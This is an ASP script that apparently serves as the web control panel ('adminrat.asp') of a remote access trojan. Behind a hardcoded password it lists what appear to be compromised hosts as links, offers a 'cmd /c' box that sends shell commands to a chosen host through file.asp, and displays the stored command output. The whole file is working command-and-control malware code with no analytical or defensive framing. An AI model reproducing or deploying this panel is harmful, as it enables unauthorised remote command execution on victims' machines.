<%
on error resume next

	if request("pass")="fan" then  '在这修改密码
		session("pw")="go"
	end if

	if session("pw")<>"go" then 
		Response.write "<br><form action='' method='post'><br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
		Response.write "<input style=width:300px;height:80px; name='pass' type='password' size='10'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input style=width:70px;height:80px; type='submit' value='submit'></form>"
	else if request("os") <> "" then
		Response.Write "<form action='/file.asp?id=" + request("os") + "' method='post' οnsubmit='return false' name='iframeForm'  target='iframeForm'>cmd: <input style=width:300px;height:50px; type='text' name='str' value='cmd /c ' /><button style=width:100px;height:50px; type='submit' class='btn btn-primary'>submit</button>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type='button' style=width:100px;height:50px; name='show' value='resh' onClick='window.location.reload();'></br></br> <!--刷新按钮--></form><iframe id='iframeForm' name='iframeForm' style='display:none;'></iframe> "
		set fs=server.createobject("scripting.filesystemobject")
		file=server.mappath(Request("os")&".dic")
		set txt=fs.opentextfile(file,1,true) '1只读,2写,8 打开文件并从文件末尾开始写,True 以 Unicode 格式打开文件,False 以 ASCII 格式打开,UseDefault 使用系统默认值打开文件
		if not txt.atendofstream then '先确定还没有到达结尾的位置
		Content = txt.ReadAll '读取整个文件的数据
		'Line = Replace(Content, vbCrlf, "<br>") '将文本内分行字符vbCrlf换成HTML换行标记"<br>"
		Response.Write "<textarea name='text' cols=100 rows=30 width=30>" + Content + "</textarea >"
		end if
		
	else
		Set fs = CreateObject("Scripting.FileSystemObject")
		Set f = fs.GetFolder(Server.MapPath(".\")) '文件夹的名称
		Set fc = f.Files
		For Each f1 In fc
        If getExt(f1.name) = "txt" Then
            response.write "<a style='font-size:70px;' href='adminrat.asp?os=" + Replace(f1.name, ".txt", "") + "' target='_blank'>" + Replace(f1.name, ".txt", "") + "</a><br>"
        End If
		Next
		Set objFolder = Nothing '释放对象 
		Set fso = Nothing
	end if
	end if

'获取文件类型
Function getExt(str)
	getExt = LCase(Right(str,Len(str) - InStrRev(str,".")))
End Function
%>